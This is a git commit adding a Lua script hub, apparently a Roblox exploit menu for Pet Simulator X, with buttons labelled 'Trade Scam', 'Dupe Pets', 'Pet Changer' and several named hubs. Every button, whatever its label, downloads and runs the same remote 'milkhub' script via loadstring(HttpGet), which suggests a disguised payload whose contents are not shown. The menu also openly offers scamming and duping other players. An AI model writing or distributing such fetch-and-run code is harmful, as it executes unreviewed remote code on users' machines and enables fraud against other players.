3f6be3478ffdcaa5e5ef876cdecbfdf8fe2c9091
RobloxScripter <129669367+PsxScripter1@users.noreply.github.com>
2023-04-15 17:13:26 +0300

    Add files via upload

---
+++ ScriptHub.lua
@@ -0,0 +1,46 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Project Orion", "Sentinel")
+
+----[MAIN CONFIG]----
+local Main = Window:NewTab("Main")
+local MainSection = Main:NewSection("Main")
+
+local Tab = Window:NewTab("Credits")
+local Section = Tab:NewSection("Script Maked by orionmeat154")
+
+local Tab = Window:NewTab("Scripts Hub")
+local SecondSection = Tab:NewSection("PSX Scripts")
+
+
+SecondSection:NewButton("Pet Changer","Visual Not FE", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PsxScripter1/WreckedHub/main/milkhub"))()
+end)
+
+SecondSection:NewButton("Catalyst Hub","Need key", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PsxScripter1/WreckedHub/main/milkhub"))()
+end)
+
+SecondSection:NewButton("Cloud Hub","Need key", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PsxScripter1/WreckedHub/main/milkhub"))()
+end)
+
+SecondSection:NewButton("MilkUp","Keyless", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PsxScripter1/WreckedHub/main/milkhub"))()
+end)
+
+SecondSection:NewButton("Project WD","Need key", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PsxScripter1/WreckedHub/main/milkhub"))()
+end)
+
+SecondSection:NewButton("Pet Changer","Visual not FE", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PsxScripter1/WreckedHub/main/milkhub"))()
+end)
+
+MainSection:NewButton("Trade Scam", "Click to On/Off", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PsxScripter1/WreckedHub/main/milkhub"))()
+end)
+
+MainSection:NewButton("Dupe Pets", "Click to duplicate", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PsxScripter1/WreckedHub/main/milkhub"))()
+end)
+
